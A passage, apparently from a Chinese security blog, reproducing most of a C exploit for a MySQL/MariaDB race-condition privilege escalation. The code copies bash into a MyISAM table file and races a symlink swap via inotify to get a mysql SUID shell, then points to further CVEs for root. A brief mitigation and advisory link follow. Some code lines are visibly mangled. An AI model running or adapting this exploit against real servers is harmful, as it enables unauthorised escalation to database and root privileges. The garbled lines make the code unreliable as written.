        }
        res = mysql_store_result(conn);
        if (res>0) mysql_free_result(res);
    }
    int main(int argc,char **argv)
    {
        int randomnum = 0;
        int io_notified = 0;
        int myd_handle;
        int wpid;
        int is_shell_suid=0;
        pid_t pid;
        int status;
        struct stat st;
        /* io notify */
        int fd;
        int ret;
        char buf[4096] __attribute__((aligned(8)));
        int num_read;
        struct inotify_event *event;
        /* credentials */
        char *user     = argv[1];
        char *password = argv[2];
        char *db_host  = argv[3];
        char *database = argv[4];
        // Disable buffering of stdout
        setvbuf(stdout, NULL, _IONBF, 0);
        // Get the params
        if (argc!=5) {
    usage(argv[0]);
    exit(1);
        } 
        intro();
        // Show initial privileges
        printf("n[+] Starting the exploit as: n");
        system("id");
        // Connect to the database server with provided credentials
        printf("n[+] Connecting to the database `%s` as %s@%sn", database, user, db_host);
        conn = mysql_init(NULL);
        if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {
            fprintf(stderr, "%sn", mysql_error(conn));
            exit(1);
        }
        // Prepare tmp dir
        printf("n[+] Creating exploit temp directory %sn", "/tmp/" EXP_DIRN);
        umask(000);
        system("rm -rf /tmp/" EXP_DIRN " && mkdir /tmp/" EXP_DIRN);
        system("chmod g+s /tmp/" EXP_DIRN );
        // Prepare exploit tables :)
        printf("n[+] Creating mysql tables nn");
        mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);
        mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);
        mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
        mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);
        // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
        // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
        printf("n[+] Copying bash into the mysql_suid_shell table.n    After the exploitation the following file/table will be assigned SUID and executable bits : n");
        system("cp /bin/bash " SUID_SHELL);
        system("ls -l " SUID_SHELL);
        // Use inotify to get the timing right
        fd = inotify_init();
        if (fd ");
     //fflush(stdout);
    }
            /* Create empty file , remove if already exists */
            unlink(MYSQL_TEMP_FILE);
            unlink(MYSQL_TAB_FILE);
       mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);
    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);
    /* random num if needed */
            srand ( time(NULL) );
            randomnum = ( rand() % MAX_DELAY );
            // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink
            pid = fork();
            if (pid  0 ) {
                io_notified = 0;
                while (1) {
                    int processed = 0;
                    ret = read(fd, buf, sizeof(buf));
                    if (ret mask & IN_CLOSE) {
                            if (!strcmp(event->name, "exploit_table.TMD")) {
                                //usleep(randomnum);
        // Set the .MYD permissions to suid+exec before they get copied to the .TMD file 
        unlink(MYSQL_TAB_FILE);
        myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);
        close(myd_handle);
        chmod(MYSQL_TAB_FILE, 04777);
        // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec
                                unlink(MYSQL_TEMP_FILE);
                                symlink(SUID_SHELL, MYSQL_TEMP_FILE);
                                io_notified=1;
                            }
                        }
                        processed += sizeof(struct inotify_event);
                    }
                    if (io_notified) {
                        break;
                    }
                }
                waitpid(pid, &status, 0);
            }
    // Check if SUID bit was set at the end of this attempt
            if ( lstat(SUID_SHELL, &st) == 0 ) {
        if (st.st_mode & S_ISUID) {
    is_shell_suid = 1;
        }
            } 
        }
        printf("nn[+] 33[94mBingo! Race won (took %lu tries) !33[0m Check out the 33[94mmysql SUID shell33[0m: nn", cnt);
        system("ls -l " SUID_SHELL);
        printf("n[+] Spawning the 33[94mmysql SUID shell33[0m now... n    Remember that from there you can gain 33[1;31mroot33[0m with vuln 33[1;31mCVE-2016-666233[0m or 33[1;31mCVE-2016-666433[0m :)nn");
        system(SUID_SHELL " -p -i ");
        //system(SUID_SHELL " -p -c '/bin/bash -i -p'");
        /* close MySQL connection and exit */
        printf("n[+] Job done. Exitingnn");
        mysql_close(conn);
        return 0;
    }
**  
**
**视频参考(11.04 9:37更新）：  
**
****
**临时解决办法：**
****
在my.cnf中添加
    symbolic-links = 0
**  
**
**参考链接：**
****
[](http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)